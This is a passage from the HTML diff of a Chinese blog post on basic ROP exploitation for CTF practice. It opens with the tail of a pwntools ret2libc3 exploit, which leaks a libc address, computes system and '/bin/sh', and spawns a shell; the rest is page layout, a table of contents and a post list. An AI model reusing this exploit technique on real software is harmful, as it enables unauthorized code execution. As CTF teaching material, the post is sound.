class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/基本ROP.html">基本ROP</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Thriumph 的个人博客">Thriumph</a></p>
+        <p><span>发布时间:</span>2019年03月20日 - 23时26分</p>
+        <p><span>最后更新:</span>2019年08月18日 - 20时08分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/基本ROP.html" title="基本ROP">http://yoursite.com/基本ROP.html</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/基本ROP.html　　作者: Thriumph" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/linux下基本缓冲区溢出shellcode编写.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          linux下基本缓冲区溢出shellcode编写
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/栈溢出的保护机制和利用方法.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">栈溢出的保护机制和利用方法</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP攻击的前提"><span class="toc-number">1.</span> <span class="toc-text">ROP攻击的前提</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-number">2.1.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">2.2.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-number">2.3.</span> <span class="toc-text">ret2syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">2.4.</span> <span class="toc-text">ret2libc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例1-ret2text"><span class="toc-number">3.</span> <span class="toc-text">例1(ret2text)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看保护措施"><span class="toc-number">3.1.</span> <span class="toc-text">查看保护措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida分析程序的溢出点"><span class="toc-number">3.2.</span> <span class="toc-text">ida分析程序的溢出点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算偏移"><span class="toc-number">3.3.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例2-ret2shellcode"><span class="toc-number">4.</span> <span class="toc-text">例2(ret2shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看保护措施-1"><span class="toc-number">4.1.</span> <span class="toc-text">查看保护措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida分析"><span class="toc-number">4.2.</span> <span class="toc-text">ida分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算偏移-1"><span class="toc-number">4.3.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写exp"><span class="toc-number">4.4.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-number">4.4.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">4.4.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例3-ret2syscall"><span class="toc-number">5.</span> <span class="toc-text">例3(ret2syscall)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看文件信息"><span class="toc-number">5.1.</span> <span class="toc-text">查看文件信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida分析-1"><span class="toc-number">5.2.</span> <span class="toc-text">ida分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算偏移-2"><span class="toc-number">5.3.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写exp-1"><span class="toc-number">5.4.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路-1"><span class="toc-number">5.4.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">5.4.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例4-ret2libc1"><span class="toc-number">6.</span> <span class="toc-text">例4(ret2libc1)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看文件信息-1"><span class="toc-number">6.1.</span> <span class="toc-text">查看文件信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用ida查看"><span class="toc-number">6.2.</span> <span class="toc-text">用ida查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算偏移-3"><span class="toc-number">6.3.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写exp-2"><span class="toc-number">6.4.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路-2"><span class="toc-number">6.4.1.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#思路1（不可行）"><span class="toc-number">6.4.1.1.</span> <span class="toc-text">思路1（不可行）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#思路二（可行）"><span class="toc-number">6.4.1.2.</span> <span class="toc-text">思路二（可行）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">6.4.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例5（ret2libc2）"><span class="toc-number">7.</span> <span class="toc-text">例5（ret2libc2）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看基本信息"><span class="toc-number">7.1.</span> <span class="toc-text">查看基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida分析-2"><span class="toc-number">7.2.</span> <span class="toc-text">ida分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算偏移-4"><span class="toc-number">7.3.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-3"><span class="toc-number">7.4.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-4"><span class="toc-number">7.5.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例6-ret2libc3"><span class="toc-number">8.</span> <span class="toc-text">例6(ret2libc3)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看文件信息-2"><span class="toc-number">8.1.</span> <span class="toc-text">查看文件信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ida分析-3"><span class="toc-number">8.2.</span> <span class="toc-text">ida分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算偏移-5"><span class="toc-number">8.3.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-4"><span class="toc-number">8.4.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取libc版本"><span class="toc-number">8.4.1.</span> <span class="toc-text">获取libc版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查找’-bin-sh’"><span class="toc-number">8.4.2.</span> <span class="toc-text">查找’/bin/sh’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取主函数地址"><span class="toc-number">8.4.3.</span> <span class="toc-text">获取主函数地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本利用思路"><span class="toc-number">8.4.4.</span> <span class="toc-text">基本利用思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-number">8.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/linux下基本缓冲区溢出shellcode编写.html" title="上一篇: linux下基本缓冲区溢出shellcode编写">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/栈溢出的保护机制和利用方法.html" title="下一篇: 栈溢出的保护机制和利用方法">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/格式化字符串漏洞.html">格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/一个有趣的a+b.html">一个有趣的a+b</a></li><li class="post-list-item"><a class="post-list-link" href="/多媒体网络.html">多媒体网络</a></li><li class="post-list-item"><a class="post-list-link" href="/计算机网络中的安全.html">计算机网络中的安全</a></li><li class="post-list-item"><a class="post-list-link" href="/无线网络和移动网络.html">无线网络和移动网络</a></li><li class="post-list-item"><a class="post-list-link" href="/链路层和局域网.html">链路层和局域网</a></li><li class="post-list-item"><a class="post-list-link" href="/网络层-控制平面.html">网络层:控制平面</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】cmd1.html">【Pwnable.kr】cmd1</a></li><li class="post-list-item"><a class="post-list-link" href="/网络层-数据平面.html">网络层:数据平面</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】lotto.html">【Pwnable.kr】lotto</a></li><li class="post-list-item"><a class="post-list-link" href="/运输层.html">运输层</a></li><li class="post-list-item"><a class="post-list-link" href="/应用层.html">应用层</a></li><li class="post-list-item"><a class="post-list-link" href="/计算机网络和因特网.html">计算机网络和因特网</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】blackjack.html">【Pwnable.kr】blackjack</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】coin1.html">【Pwnable.kr】coin1</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】shellcode.html">【Pwnable.kr】shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】mistake.html">【Pwnable.kr】mistake</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】leg.html">【Pwnable.kr】leg</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】input.html">【Pwnable.kr】input</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】random.html">【Pwnable.kr】random</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】passcode.html">【Pwnable.kr】passcode</a></li><li class="post-list-item"><a class="post-list-link" href="/选择.html">选择</a></li><li class="post-list-item"><a class="post-list-link" href="/十大排序.html">十大排序</a></li><li class="post-list-item"><a class="post-list-link" href="/RC4.html">RC4</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】collision.html">【Pwnable.kr】collision</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】flag.html">【Pwnable.kr】flag</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】bof.html">【Pwnable.kr】bof</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】fd.html">【Pwnable.kr】fd</a></li><li class="post-list-item"><a class="post-list-link" href="/哈夫曼树.html">哈夫曼树</a></li><li class="post-list-item"><a class="post-list-link" href="/数据结构课程设计.html">数据结构课程设计</a></li><li class="post-list-item"><a class="post-list-link" href="/ISCC2019线上.html">ISCC2019线上</a></li><li class="post-list-item"><a class="post-list-link" href="/DFS递归形式和非递归形式.html">DFS递归形式和非递归形式</a></li><li class="post-list-item"><a class="post-list-link" href="/链表.html">链表</a></li><li class="post-list-item"><a class="post-list-link" href="/掘安杯.html">掘安杯</a></li><li class="post-list-item"><a class="post-list-link" href="/gadget-libc-csu-init.html">gadget_libc_csu_init</a></li><li class="post-list-item"><a class="post-list-link" href="/嘉韦思杯.html">嘉韦思杯</a></li><li class="post-list-item"><a class="post-list-link" href="/linux下基本缓冲区溢出shellcode编写.html">linux下基本缓冲区溢出shellcode编写</a></li><li class="post-list-item"><a class="post-list-link" href="/基本ROP.html">基本ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/栈溢出的保护机制和利用方法.html">栈溢出的保护机制和利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/gdb常用命令.html">gdb常用命令</a></li><li class="post-list-item"><a class="post-list-link" href="/pwn-环境配置.html">pwn 环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/kali更新源.html">kali更新源</a></li><li class="post-list-item"><a class="post-list-link" href="/rc3ctf-logmein.html">rc3ctf--logmein</a></li><li class="post-list-item"><a class="post-list-link" href="/ctf编码加解密总结.html">ctf编码加解密总结</a></li><li class="post-list-item"><a class="post-list-link" href="/DLL注入.html">DLL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/windows消息钩取.html">windows消息钩取</a></li><li class="post-list-item"><a class="post-list-link" href="/BugKu逆向.html">BugKu逆向</a></li><li class="post-list-item"><a class="post-list-link" href="/内嵌补丁.html">内嵌补丁</a></li><li class="post-list-item"><a class="post-list-link" href="/ESP脱壳定律.html">ESP定律脱壳</a></li><li class="post-list-item"><a class="post-list-link" href="/IAT导入地址表-EAT机制.html">IAT导入地址表/EAT机制</a></li><li class="post-list-item"><a class="post-list-link" href="/VA-RVA-RAW.html">VA RVA RAW</a></li><li class="post-list-item"><a class="post-list-link" href="/PE文件格式.html">PE文件格式</a></li><li class="post-list-item"><a class="post-list-link" href="/寄存器.html">寄存器</a></li><li class="post-list-item"><a class="post-list-link" href="/栈帧.html">栈帧</a></li><li class="post-list-item"><a class="post-list-link" href="/南邮逆向.html">南邮逆向</a></li><li class="post-list-item"><a class="post-list-link" href="/ctf-play-a-game.html">ctf play a game</a></li><li class="post-list-item"><a class="post-list-link" href="/关于二进制.html">关于二进制</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 Thriumph
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 4;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
